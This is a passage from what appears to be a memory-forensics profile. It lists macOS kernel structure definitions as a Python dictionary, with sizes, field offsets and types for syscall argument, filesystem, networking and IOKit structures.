    'mps_nsrequest': [0x20, ['int']],
    'mps_flags': [0x24, ['unsigned int']],
}],
  'sysdoproc_args': [ 0x48, {
    'buflen': [0x0, ['int']],
    'kprocp': [0x8, ['pointer', ['void']]],
    'is_64_bit': [0x10, ['int']],
    'dp': [0x18, ['unsigned long long']],
    'needed': [0x20, ['unsigned long']],
    'sizeof_kproc': [0x28, ['int']],
    'errorp': [0x30, ['pointer', ['int']]],
    'uidcheck': [0x38, ['int']],
    'ruidcheck': [0x3c, ['int']],
    'ttycheck': [0x40, ['int']],
    'uidval': [0x44, ['int']],
}],
  'group_source_req': [ 0x104, {
    'gsr_interface': [0x0, ['unsigned int']],
    'gsr_group': [0x4, ['sockaddr_storage']],
    'gsr_source': [0x84, ['sockaddr_storage']],
}],
  'searchfs_args': [ 0x30, {
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path': [0x0, ['unsigned long long']],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'searchblock_l_': [0x8, ['array', 0, ['char']]],
    'searchblock': [0x8, ['unsigned long long']],
    'searchblock_r_': [0x10, ['array', 0, ['char']]],
    'nummatches_l_': [0x10, ['array', 0, ['char']]],
    'nummatches': [0x10, ['unsigned long long']],
    'nummatches_r_': [0x18, ['array', 0, ['char']]],
    'scriptcode': [0x18, ['unsigned int']],
    'scriptcode_l_': [0x18, ['array', 0, ['char']]],
    'scriptcode_r_': [0x1c, ['array', 4, ['char']]],
    'options_l_': [0x20, ['array', 0, ['char']]],
    'options': [0x20, ['unsigned int']],
    'options_r_': [0x24, ['array', 4, ['char']]],
    'state_l_': [0x28, ['array', 0, ['char']]],
    'state': [0x28, ['unsigned long long']],
    'state_r_': [0x30, ['array', 0, ['char']]],
}],
  'minherit_args': [ 0x18, {
    'addr': [0x0, ['unsigned long long']],
    'addr_l_': [0x0, ['array', 0, ['char']]],
    'addr_r_': [0x8, ['array', 0, ['char']]],
    'len': [0x8, ['unsigned long long']],
    'len_l_': [0x8, ['array', 0, ['char']]],
    'len_r_': [0x10, ['array', 0, ['char']]],
    'inherit': [0x10, ['int']],
    'inherit_l_': [0x10, ['array', 0, ['char']]],
    'inherit_r_': [0x14, ['array', 4, ['char']]],
}],
  'journal_header': [ 0x30, {
    'magic': [0x0, ['int']],
    'endian': [0x4, ['int']],
    'start': [0x8, ['long long']],
    'end': [0x10, ['long long']],
    'size': [0x18, ['long long']],
    'blhdr_size': [0x20, ['int']],
    'checksum': [0x24, ['unsigned int']],
    'jhdr_size': [0x28, ['int']],
    'sequence_num': [0x2c, ['unsigned int']],
}],
  'sync_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'thread_switch_args': [ 0x18, {
    'thread_name': [0x0, ['unsigned int']],
    'thread_name_l_': [0x0, ['array', 0, ['char']]],
    'thread_name_r_': [0x4, ['array', 4, ['char']]],
    'option': [0x8, ['int']],
    'option_l_': [0x8, ['array', 0, ['char']]],
    'option_r_': [0xc, ['array', 4, ['char']]],
    'option_time': [0x10, ['unsigned int']],
    'option_time_l_': [0x10, ['array', 0, ['char']]],
    'option_time_r_': [0x14, ['array', 4, ['char']]],
}],
  '__unnamed_13427720': [ 0x4, {
    'n_strx': [0x0, ['unsigned int']],
}],
  'iovec': [ 0x10, {
    'iov_base': [0x0, ['pointer', ['void']]],
    'iov_len': [0x8, ['unsigned long']],
}],
  '__unnamed_4586359': [ 0x18, {
    'cu_isf': [0x0, ['unsigned long long']],
    'cu_tmp': [0x8, ['unsigned long long']],
    'cu_user_gs_base': [0x10, ['unsigned long long']],
}],
  '__old_semwait_signal_nocancel_args': [ 0x28, {
    'cond_sem_l_': [0x0, ['array', 0, ['char']]],
    'cond_sem': [0x0, ['int']],
    'cond_sem_r_': [0x4, ['array', 4, ['char']]],
    'mutex_sem': [0x8, ['int']],
    'mutex_sem_l_': [0x8, ['array', 0, ['char']]],
    'mutex_sem_r_': [0xc, ['array', 4, ['char']]],
    'timeout_l_': [0x10, ['array', 0, ['char']]],
    'timeout': [0x10, ['int']],
    'timeout_r_': [0x14, ['array', 4, ['char']]],
    'relative_l_': [0x18, ['array', 0, ['char']]],
    'relative': [0x18, ['int']],
    'relative_r_': [0x1c, ['array', 4, ['char']]],
    'ts': [0x20, ['unsigned long long']],
    'ts_l_': [0x20, ['array', 0, ['char']]],
    'ts_r_': [0x28, ['array', 0, ['char']]],
}],
  'fp_control': [ 0x2, {
    'undfl': [0x0, ['BitField', {'end_bit': 5, 'start_bit': 4}]],
    'ovrfl': [0x0, ['BitField', {'end_bit': 4, 'start_bit': 3}]],
    'rc': [0x0, ['BitField', {'end_bit': 12, 'start_bit': 10}]],
    'denorm': [0x0, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    'invalid': [0x0, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'precis': [0x0, ['BitField', {'end_bit': 6, 'start_bit': 5}]],
    'pc': [0x0, ['BitField', {'end_bit': 10, 'start_bit': 8}]],
    'zdiv': [0x0, ['BitField', {'end_bit': 3, 'start_bit': 2}]],
}],
  'fstatfs64_args': [ 0x10, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'buf_l_': [0x8, ['array', 0, ['char']]],
    'buf': [0x8, ['unsigned long long']],
    'buf_r_': [0x10, ['array', 0, ['char']]],
}],
  '__unnamed_5419165': [ 0x6b0, {
    'type': [0x0, ['unsigned int']],
    'keybytes': [0x4, ['unsigned int']],
    'hash_len': [0x8, ['unsigned int']],
    'skey': [0xc, ['array', 24, ['unsigned char']]],
    'ks_u': [0x30, ['__unnamed_5419230']],
}],
  'mem_and_io_snapshot': [ 0x3d, {
    'snapshot_magic': [0x0, ['unsigned int']],
    'free_pages': [0x4, ['unsigned int']],
    'active_pages': [0x8, ['unsigned int']],
    'inactive_pages': [0xc, ['unsigned int']],
    'purgeable_pages': [0x10, ['unsigned int']],
    'wired_pages': [0x14, ['unsigned int']],
    'speculative_pages': [0x18, ['unsigned int']],
    'throttled_pages': [0x1c, ['unsigned int']],
    'filebacked_pages': [0x20, ['unsigned int']],
    'compressions': [0x24, ['unsigned int']],
    'decompressions': [0x28, ['unsigned int']],
    'compressor_size': [0x2c, ['unsigned int']],
    'busy_buffer_count': [0x30, ['int']],
    'pages_wanted': [0x34, ['unsigned int']],
    'pages_reclaimed': [0x38, ['unsigned int']],
    'pages_wanted_reclaimed_valid': [0x3c, ['unsigned char']],
}],
  'ni_reply_fqdn': [ 0x8, {
    'ni_fqdn_ttl': [0x0, ['unsigned int']],
    'ni_fqdn_namelen': [0x4, ['unsigned char']],
    'ni_fqdn_name': [0x5, ['array', 3, ['unsigned char']]],
}],
  '__unnamed_17151008': [ 0x10, {
    'le_next': [0x0, ['pointer', ['pgrp']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['pgrp']]]],
}],
  'vnop_create_args': [ 0x30, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_dvp': [0x8, ['pointer', ['vnode']]],
    'a_vpp': [0x10, ['pointer', ['pointer', ['vnode']]]],
    'a_cnp': [0x18, ['pointer', ['componentname']]],
    'a_vap': [0x20, ['pointer', ['vnode_attr']]],
    'a_context': [0x28, ['pointer', ['vfs_context']]],
}],
  'user32_eproc': [ 0x128, {
    'e_paddr': [0x0, ['unsigned int']],
    'e_sess': [0x4, ['unsigned int']],
    'e_pcred': [0x8, ['user32_pcred']],
    'e_ucred': [0x68, ['_ucred']],
    'e_vm': [0xb4, ['user32_vmspace']],
    'e_ppid': [0xdc, ['int']],
    'e_pgid': [0xe0, ['int']],
    'e_jobc': [0xe4, ['short']],
    'e_tdev': [0xe8, ['int']],
    'e_tpgid': [0xec, ['int']],
    'e_tsess': [0xf0, ['unsigned int']],
    'e_wmesg': [0xf4, ['array', 8, ['char']]],
    'e_xsize': [0xfc, ['int']],
    'e_xrssize': [0x100, ['short']],
    'e_xccount': [0x102, ['short']],
    'e_xswrss': [0x104, ['short']],
    'e_flag': [0x108, ['int']],
    'e_login': [0x10c, ['array', 12, ['char']]],
    'e_lcid': [0x118, ['int']],
    'e_spare': [0x11c, ['array', 3, ['int']]],
}],
  'sadb_supported': [ 0x8, {
    'sadb_supported_len': [0x0, ['unsigned short']],
    'sadb_supported_exttype': [0x2, ['unsigned short']],
    'sadb_supported_reserved': [0x4, ['unsigned int']],
}],
  'ml_cpu_info': [ 0x20, {
    'vector_unit': [0x0, ['unsigned int']],
    'cache_line_size': [0x4, ['unsigned int']],
    'l1_icache_size': [0x8, ['unsigned int']],
    'l1_dcache_size': [0xc, ['unsigned int']],
    'l2_settings': [0x10, ['unsigned int']],
    'l2_cache_size': [0x14, ['unsigned int']],
    'l3_settings': [0x18, ['unsigned int']],
    'l3_cache_size': [0x1c, ['unsigned int']],
}],
  'fasttrap_id_tp': [ 0x20, {
    'fit_id': [0x0, ['fasttrap_id']],
    'fit_tp': [0x18, ['pointer', ['fasttrap_tracepoint']]],
}],
  'queue_entry': [ 0x10, {
    'next': [0x0, ['pointer', ['queue_entry']]],
    'prev': [0x8, ['pointer', ['queue_entry']]],
}],
  'pfr_ktable': [ 0x508, {
    'pfrkt_ts': [0x0, ['pfr_tstats']],
    'pfrkt_tree': [0x4b0, ['__unnamed_9380908']],
    'pfrkt_workq': [0x4c8, ['__unnamed_9380979']],
    'pfrkt_ip4': [0x4d0, ['pointer', ['radix_node_head']]],
    'pfrkt_ip6': [0x4d8, ['pointer', ['radix_node_head']]],
    'pfrkt_shadow': [0x4e0, ['pointer', ['pfr_ktable']]],
    'pfrkt_root': [0x4e8, ['pointer', ['pfr_ktable']]],
    'pfrkt_rs': [0x4f0, ['pointer', ['pf_ruleset']]],
    'pfrkt_larg': [0x4f8, ['unsigned long long']],
    'pfrkt_nflags': [0x500, ['unsigned int']],
}],
  'kev_in_data': [ 0x34, {
    'link_data': [0x0, ['net_event_data']],
    'ia_addr': [0x18, ['in_addr']],
    'ia_net': [0x1c, ['unsigned int']],
    'ia_netmask': [0x20, ['unsigned int']],
    'ia_subnet': [0x24, ['unsigned int']],
    'ia_subnetmask': [0x28, ['unsigned int']],
    'ia_netbroadcast': [0x2c, ['in_addr']],
    'ia_dstaddr': [0x30, ['in_addr']],
}],
  'xcpmio_cpu_status': [ 0x90, {
    'sts_voltage': [0x0, ['unsigned int']],
    'sts_pkg_freq': [0x4, ['unsigned int']],
    'sts_now_freq': [0x8, ['unsigned int']],
    'sts_ncpus': [0xc, ['unsigned int']],
    'sts_cpu_freq': [0x10, ['array', 32, ['unsigned int']]],
}],
  '_load_result': [ 0x60, {
    'mach_header': [0x0, ['unsigned long long']],
    'entry_point': [0x8, ['unsigned long long']],
    'user_stack': [0x10, ['unsigned long long']],
    'user_stack_size': [0x18, ['unsigned long long']],
    'all_image_info_addr': [0x20, ['unsigned long long']],
    'all_image_info_size': [0x28, ['unsigned long long']],
    'thread_count': [0x30, ['int']],
    'unixproc': [0x34, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'validentry': [0x34, ['BitField', {'end_bit': 6, 'start_bit': 5}]],
    'prog_allocated_stack': [0x34, ['BitField', {'end_bit': 4, 'start_bit': 3}]],
    'needs_dynlinker': [0x34, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    'dynlinker': [0x34, ['BitField', {'end_bit': 3, 'start_bit': 2}]],
    'prog_stack_size': [0x34, ['BitField', {'end_bit': 5, 'start_bit': 4}]],
    'csflags': [0x38, ['unsigned int']],
    'uuid': [0x3c, ['array', 16, ['unsigned char']]],
    'min_vm_addr': [0x50, ['unsigned long long']],
    'max_vm_addr': [0x58, ['unsigned long long']],
}],
  '__unnamed_5252259': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfsd']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfsd']]]],
}],
  'nstat_msg_query_src': [ 0x14, {
    'hdr': [0x0, ['nstat_msg_hdr']],
    'srcref': [0x10, ['unsigned int']],
}],
  'mmst_reg': [ 0x10, {
    'mmst_reg': [0x0, ['array', 10, ['char']]],
    'mmst_rsrv': [0xa, ['array', 6, ['char']]],
}],
  'vnop_compound_open_args': [ 0x60, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_dvp': [0x8, ['pointer', ['vnode']]],
    'a_vpp': [0x10, ['pointer', ['pointer', ['vnode']]]],
    'a_fmode': [0x18, ['int']],
    'a_cnp': [0x20, ['pointer', ['componentname']]],
    'a_vap': [0x28, ['pointer', ['vnode_attr']]],
    'a_flags': [0x30, ['unsigned int']],
    'a_status': [0x38, ['pointer', ['unsigned int']]],
    'a_context': [0x40, ['pointer', ['vfs_context']]],
    'a_open_create_authorizer': [0x48, ['pointer', ['void']]],
    'a_open_existing_authorizer': [0x50, ['pointer', ['void']]],
    'a_reserved': [0x58, ['pointer', ['void']]],
}],
  '__unnamed_12483677': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'user64_mnt_imgsrc_args': [ 0x10, {
    'mi_height': [0x0, ['unsigned int']],
    'mi_flags': [0x4, ['unsigned int']],
    'mi_devpath': [0x8, ['unsigned long long']],
}],
  '__unnamed_5422091': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfs_file_lock']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfs_file_lock']]]],
}],
  'fstat64_extended_args': [ 0x20, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'ub_l_': [0x8, ['array', 0, ['char']]],
    'ub': [0x8, ['unsigned long long']],
    'xsecurity': [0x10, ['unsigned long long']],
    'ub_r_': [0x10, ['array', 0, ['char']]],
    'xsecurity_l_': [0x10, ['array', 0, ['char']]],
    'xsecurity_r_': [0x18, ['array', 0, ['char']]],
    'xsecurity_size': [0x18, ['unsigned long long']],
    'xsecurity_size_l_': [0x18, ['array', 0, ['char']]],
    'xsecurity_size_r_': [0x20, ['array', 0, ['char']]],
}],
  'llinfo_arp': [ 0x38, {
    'la_le': [0x0, ['__unnamed_7938341']],
    'la_rt': [0x10, ['pointer', ['rtentry']]],
    'la_hold': [0x18, ['pointer', ['mbuf']]],
    'la_llreach': [0x20, ['pointer', ['if_llreach']]],
    'la_lastused': [0x28, ['unsigned long long']],
    'la_asked': [0x30, ['unsigned int']],
    'la_maxtries': [0x34, ['unsigned int']],
}],
  '__unnamed_17157502': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['eventqelt']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['eventqelt']]]],
}],
  'nfs_export_stat_desc': [ 0x8, {
    'rec_vers': [0x0, ['unsigned int']],
    'rec_count': [0x4, ['unsigned int']],
}],
  '__unnamed_6844035': [ 0x8, {
    'ibsru_buffer': [0x0, ['pointer', ['void']]],
    'ibsru_buffer64': [0x0, ['unsigned long long']],
}],
  '__unnamed_6518733': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['bstp_port']]],
}],
  'user32_sigval': [ 0x4, {
    'sival_int': [0x0, ['int']],
    'sival_ptr': [0x0, ['unsigned int']],
}],
  'hfs_journal_relocate_args': [ 0x18, {
    'hfsmp': [0x0, ['pointer', ['hfsmount']]],
    'context': [0x8, ['pointer', ['vfs_context']]],
    'newStartBlock': [0x10, ['unsigned int']],
    'newBlockCount': [0x14, ['unsigned int']],
}],
  '__unnamed_17060066': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['namecache']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['namecache']]]],
}],
  'tcp_measure_bw_burst': [ 0x8, {
    'min_burst_size': [0x0, ['unsigned int']],
    'max_burst_size': [0x4, ['unsigned int']],
}],
  'dtrace_probekey': [ 0x48, {
    'dtpk_prov': [0x0, ['pointer', ['char']]],
    'dtpk_pmatch': [0x8, ['pointer', ['void']]],
    'dtpk_mod': [0x10, ['pointer', ['char']]],
    'dtpk_mmatch': [0x18, ['pointer', ['void']]],
    'dtpk_func': [0x20, ['pointer', ['char']]],
    'dtpk_fmatch': [0x28, ['pointer', ['void']]],
    'dtpk_name': [0x30, ['pointer', ['char']]],
    'dtpk_nmatch': [0x38, ['pointer', ['void']]],
    'dtpk_id': [0x40, ['unsigned int']],
}],
  '__unnamed_7469652': [ 0x8, {
    'pgtu_buf': [0x0, ['unsigned long long']],
    'pgtu_tokens': [0x0, ['unsigned long long']],
}],
  'user32_msqid_ds': [ 0x5c, {
    'msg_perm': [0x0, ['ipc_perm']],
    'msg_first': [0x18, ['int']],
    'msg_last': [0x1c, ['int']],
    'msg_cbytes': [0x20, ['unsigned int']],
    'msg_qnum': [0x24, ['unsigned int']],
    'msg_qbytes': [0x28, ['unsigned int']],
    'msg_lspid': [0x2c, ['int']],
    'msg_lrpid': [0x30, ['int']],
    'msg_stime': [0x34, ['int']],
    'msg_pad1': [0x38, ['int']],
    'msg_rtime': [0x3c, ['int']],
    'msg_pad2': [0x40, ['int']],
    'msg_ctime': [0x44, ['int']],
    'msg_pad3': [0x48, ['int']],
    'msg_pad4': [0x4c, ['array', 4, ['int']]],
}],
  'fat_arch': [ 0x14, {
    'cputype': [0x0, ['int']],
    'cpusubtype': [0x4, ['int']],
    'offset': [0x8, ['unsigned int']],
    'size': [0xc, ['unsigned int']],
    'align': [0x10, ['unsigned int']],
}],
  'alarm': [ 0x50, {
    'al_next': [0x0, ['pointer', ['alarm']]],
    'al_prev': [0x8, ['pointer', ['alarm']]],
    'al_status': [0x10, ['int']],
    'al_time': [0x14, ['mach_timespec']],
    'al_alrm': [0x20, ['__unnamed_693517']],
    'al_seqno': [0x48, ['long']],
}],
  'osockaddr': [ 0x10, {
    'sa_family': [0x0, ['unsigned short']],
    'sa_data': [0x2, ['array', 14, ['char']]],
}],
  'ifaliasreq': [ 0x40, {
    'ifra_name': [0x0, ['array', 16, ['char']]],
    'ifra_addr': [0x10, ['sockaddr']],
    'ifra_broadaddr': [0x20, ['sockaddr']],
    'ifra_mask': [0x30, ['sockaddr']],
}],
  'buf_iterate_info_t': [ 0x10, {
    'flag': [0x0, ['int']],
    'listhead': [0x8, ['pointer', ['buflists']]],
}],
  'system_override_args': [ 0x10, {
    'timeout_l_': [0x0, ['array', 0, ['char']]],
    'timeout': [0x0, ['unsigned long long']],
    'flags_l_': [0x8, ['array', 0, ['char']]],
    'flags': [0x8, ['unsigned long long']],
    'timeout_r_': [0x8, ['array', 0, ['char']]],
    'flags_r_': [0x10, ['array', 0, ['char']]],
}],
  'aio_write_args': [ 0x8, {
    'aiocbp': [0x0, ['unsigned long long']],
    'aiocbp_l_': [0x0, ['array', 0, ['char']]],
    'aiocbp_r_': [0x8, ['array', 0, ['char']]],
}],
  'speedtab': [ 0x8, {
    'sp_speed': [0x0, ['int']],
    'sp_code': [0x4, ['int']],
}],
  '__unnamed_16449602': [ 0x10, {
    'record': [0x0, ['AggressivesRecord']],
    'service': [0x0, ['pointer', ['IOService_class']]],
}],
  'fhandle': [ 0x84, {
    'fh_len': [0x0, ['int']],
    'fh_data': [0x4, ['array', 128, ['unsigned char']]],
}],
  'task_self_trap_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'IOStatisticsCommandQueues': [ 0x8, {
    'created': [0x0, ['unsigned int']],
    'actionCalls': [0x4, ['unsigned int']],
}],
  'settid_with_pid_args': [ 0x10, {
    'pid': [0x0, ['int']],
    'pid_l_': [0x0, ['array', 0, ['char']]],
    'pid_r_': [0x4, ['array', 4, ['char']]],
    'assume': [0x8, ['int']],
    'assume_l_': [0x8, ['array', 0, ['char']]],
    'assume_r_': [0xc, ['array', 4, ['char']]],
}],
  '_kernelrpc_mach_port_mod_refs_args': [ 0x20, {
    'target': [0x0, ['unsigned int']],
    'target_l_': [0x0, ['array', 0, ['char']]],
    'target_r_': [0x4, ['array', 4, ['char']]],
    'name_l_': [0x8, ['array', 0, ['char']]],
    'name': [0x8, ['unsigned int']],
    'name_r_': [0xc, ['array', 4, ['char']]],
    'right': [0x10, ['unsigned int']],
    'right_l_': [0x10, ['array', 0, ['char']]],
    'right_r_': [0x14, ['array', 4, ['char']]],
    'delta_l_': [0x18, ['array', 0, ['char']]],
    'delta': [0x18, ['int']],
    'delta_r_': [0x1c, ['array', 4, ['char']]],
}],
  'socket_au_info': [ 0x110, {
    'sai_domain': [0x0, ['int']],
    'sai_type': [0x4, ['int']],
    'sai_protocol': [0x8, ['int']],
    'sai_faddr': [0x10, ['sockaddr_storage']],
    'sai_laddr': [0x90, ['sockaddr_storage']],
}],
  'dqfilehdr': [ 0x40, {
    'dqh_magic': [0x0, ['unsigned int']],
    'dqh_version': [0x4, ['unsigned int']],
    'dqh_maxentries': [0x8, ['unsigned int']],
    'dqh_entrycnt': [0xc, ['unsigned int']],
    'dqh_flags': [0x10, ['unsigned int']],
    'dqh_chktime': [0x14, ['unsigned int']],
    'dqh_btime': [0x18, ['unsigned int']],
    'dqh_itime': [0x1c, ['unsigned int']],
    'dqh_string': [0x20, ['array', 16, ['char']]],
    'dqh_spare': [0x30, ['array', 4, ['unsigned int']]],
}],
  'pf_anchor_node': [ 0x8, {
    'rbh_root': [0x0, ['pointer', ['pf_anchor']]],
}],
  '__unnamed_17154041': [ 0x10, {
    'le_next': [0x0, ['pointer', ['proc']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['proc']]]],
}],
  'fat_header': [ 0x8, {
    'magic': [0x0, ['unsigned int']],
    'nfat_arch': [0x4, ['unsigned int']],
}],
  'dqdirtylist': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['dquot']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['dquot']]]],
}],
  '__old_semwait_signal_args': [ 0x28, {
    'cond_sem_l_': [0x0, ['array', 0, ['char']]],
    'cond_sem': [0x0, ['int']],
    'cond_sem_r_': [0x4, ['array', 4, ['char']]],
    'mutex_sem': [0x8, ['int']],
    'mutex_sem_l_': [0x8, ['array', 0, ['char']]],
    'mutex_sem_r_': [0xc, ['array', 4, ['char']]],
    'timeout_l_': [0x10, ['array', 0, ['char']]],
    'timeout': [0x10, ['int']],
    'timeout_r_': [0x14, ['array', 4, ['char']]],
    'relative_l_': [0x18, ['array', 0, ['char']]],
    'relative': [0x18, ['int']],
    'relative_r_': [0x1c, ['array', 4, ['char']]],
    'ts': [0x20, ['unsigned long long']],
    'ts_l_': [0x20, ['array', 0, ['char']]],
    'ts_r_': [0x28, ['array', 0, ['char']]],
}],
  'hfs_mount_args': [ 0x28, {
    'hfs_uid': [0x0, ['unsigned int']],
    'hfs_gid': [0x4, ['unsigned int']],
    'hfs_mask': [0x8, ['unsigned short']],
    'hfs_encoding': [0xc, ['unsigned int']],
    'hfs_timezone': [0x10, ['timezone']],
    'flags': [0x18, ['int']],
    'journal_tbuffer_size': [0x1c, ['int']],
    'journal_flags': [0x20, ['int']],
    'journal_disable': [0x24, ['int']],
}],
  'mach_gss_accept_sec_contextMessU': [ 0x45c, {
    'Out': [0x0, ['__unnamed_130286']],
    'In': [0x0, ['__unnamed_130088']],
}],
  'sdt_probedesc': [ 0x20, {
    'sdpd_name': [0x0, ['pointer', ['char']]],
    'sdpd_func': [0x8, ['pointer', ['char']]],
    'sdpd_offset': [0x10, ['unsigned long']],
    'sdpd_next': [0x18, ['pointer', ['sdt_probedesc']]],
}],
  'au_malloc_type': [ 0x10, {
    'mt_magic': [0x0, ['unsigned int']],
    'mt_shortdesc': [0x8, ['pointer', ['char']]],
}],
  'ifnet_attach_proto_param': [ 0x48, {
    'demux_array': [0x0, ['pointer', ['ifnet_demux_desc']]],
    'demux_count': [0x8, ['unsigned int']],
    'input': [0x10, ['pointer', ['void']]],
    'pre_output': [0x18, ['pointer', ['void']]],
    'event': [0x20, ['pointer', ['void']]],
    'ioctl': [0x28, ['pointer', ['void']]],
    'detached': [0x30, ['pointer', ['void']]],
    'resolve': [0x38, ['pointer', ['void']]],
    'send_arp': [0x40, ['pointer', ['void']]],
}],
  '__unnamed_15396395': [ 0x40, {
    'b8': [0x0, ['array', 64, ['unsigned char']]],
    'b32': [0x0, ['array', 16, ['unsigned int']]],
}],
  'close_nocancel_args': [ 0x8, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
}],
  'vnode_trigger_param': [ 0x88, {
    'vnt_params': [0x0, ['vnode_fsparam']],
    'vnt_resolve_func': [0x58, ['pointer', ['void']]],
    'vnt_unresolve_func': [0x60, ['pointer', ['void']]],
    'vnt_rearm_func': [0x68, ['pointer', ['void']]],
    'vnt_reclaim_func': [0x70, ['pointer', ['void']]],
    'vnt_data': [0x78, ['pointer', ['void']]],
    'vnt_flags': [0x80, ['unsigned int']],
}],
  'getdtablesize_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'user32_stat': [ 0x60, {
    'st_dev': [0x0, ['int']],
    'st_ino': [0x4, ['unsigned int']],
    'st_mode': [0x8, ['unsigned short']],
    'st_nlink': [0xa, ['unsigned short']],
    'st_uid': [0xc, ['unsigned int']],
    'st_gid': [0x10, ['unsigned int']],
    'st_rdev': [0x14, ['int']],
    'st_atimespec': [0x18, ['user32_timespec']],
    'st_mtimespec': [0x20, ['user32_timespec']],
    'st_ctimespec': [0x28, ['user32_timespec']],
    'st_size': [0x30, ['long long']],
    'st_blocks': [0x38, ['long long']],
    'st_blksize': [0x40, ['int']],
    'st_flags': [0x44, ['unsigned int']],
    'st_gen': [0x48, ['unsigned int']],
    'st_lspare': [0x4c, ['int']],
    'st_qspare': [0x50, ['array', 2, ['long long']]],
}],
  'grrr_group': [ 0x40, {
    'priority_order': [0x0, ['queue_entry']],
    'minpriority': [0x10, ['unsigned char']],
    'index': [0x11, ['unsigned char']],
    'clients': [0x18, ['queue_entry']],
    'count': [0x28, ['int']],
    'weight': [0x2c, ['unsigned int']],
    'work': [0x30, ['unsigned int']],
    'current_client': [0x38, ['pointer', ['thread']]],
}],
  'blist': [ 0x20, {
    'bl_blocks': [0x0, ['int']],
    'bl_radix': [0x4, ['int']],
    'bl_skip': [0x8, ['int']],
    'bl_free': [0xc, ['int']],
    'bl_root': [0x10, ['pointer', ['blmeta']]],
    'bl_rootblks': [0x18, ['int']],
}],
  'ifnet_init_eparams': [ 0x158, {
    'ver': [0x0, ['unsigned int']],
    'len': [0x4, ['unsigned int']],
    'flags': [0x8, ['unsigned int']],
    'uniqueid': [0x10, ['pointer', ['void']]],
    'uniqueid_len': [0x18, ['unsigned int']],
    'name': [0x20, ['pointer', ['char']]],
    'unit': [0x28, ['unsigned int']],
    'family': [0x2c, ['unsigned int']],
    'type': [0x30, ['unsigned int']],
    'sndq_maxlen': [0x34, ['unsigned int']],
    'output': [0x38, ['pointer', ['void']]],
    'pre_enqueue': [0x40, ['pointer', ['void']]],
    'start': [0x48, ['pointer', ['void']]],
    'output_ctl': [0x50, ['pointer', ['void']]],
    'output_sched_model': [0x58, ['unsigned int']],
    'reserved': [0x5c, ['unsigned int']],
    'output_bw': [0x60, ['unsigned long long']],
    'output_bw_max': [0x68, ['unsigned long long']],
    'output_lt': [0x70, ['unsigned long long']],
    'output_lt_max': [0x78, ['unsigned long long']],
    '_reserved': [0x80, ['array', 2, ['unsigned long long']]],
    'input_poll': [0x90, ['pointer', ['void']]],
    'input_ctl': [0x98, ['pointer', ['void']]],
    'rcvq_maxlen': [0xa0, ['unsigned int']],
    '__reserved': [0xa4, ['unsigned int']],
    'input_bw': [0xa8, ['unsigned long long']],
    'input_bw_max': [0xb0, ['unsigned long long']],
    'input_lt': [0xb8, ['unsigned long long']],
    'input_lt_max': [0xc0, ['unsigned long long']],
    '___reserved': [0xc8, ['array', 2, ['unsigned long long']]],
    'demux': [0xd8, ['pointer', ['void']]],
    'add_proto': [0xe0, ['pointer', ['void']]],
    'del_proto': [0xe8, ['pointer', ['void']]],
    'check_multi': [0xf0, ['pointer', ['void']]],
    'framer': [0xf8, ['pointer', ['void']]],
    'softc': [0x100, ['pointer', ['void']]],
    'ioctl': [0x108, ['pointer', ['void']]],
    'set_bpf_tap': [0x110, ['pointer', ['void']]],
    'detach': [0x118, ['pointer', ['void']]],
    'event': [0x120, ['pointer', ['void']]],
    'broadcast_addr': [0x128, ['pointer', ['void']]],
    'broadcast_len': [0x130, ['unsigned int']],
    'framer_extended': [0x138, ['pointer', ['void']]],
    'subfamily': [0x140, ['unsigned int']],
    '____reserved': [0x144, ['unsigned int']],
    '_____reserved': [0x148, ['array', 2, ['unsigned long long']]],
}],
  'x86_state_hdr': [ 0x8, {
    'flavor': [0x0, ['int']],
    'count': [0x4, ['int']],
}],
  '__unnamed_17157186': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['socket']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['socket']]]],
}],
  'user32_ext_access_t': [ 0x20, {
    'flags': [0x0, ['unsigned int']],
    'num_files': [0x4, ['unsigned int']],
    'map_size': [0x8, ['unsigned int']],
    'file_ids': [0xc, ['unsigned int']],
    'bitmap': [0x10, ['unsigned int']],
    'access': [0x14, ['unsigned int']],
    'num_parents': [0x18, ['unsigned int']],
    'parents': [0x1c, ['unsigned int']],
}],
  'IOInterleavedMemoryDescriptor_class': [ 0x90, {
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    '_descriptorCapacity': [0x60, ['unsigned long long']],
    '_descriptorCount': [0x68, ['unsigned int']],
    '_descriptors': [0x70, ['pointer', ['pointer', ['IOMemoryDescriptor_class']]]],
    '_descriptorOffsets': [0x78, ['pointer', ['unsigned long long']]],
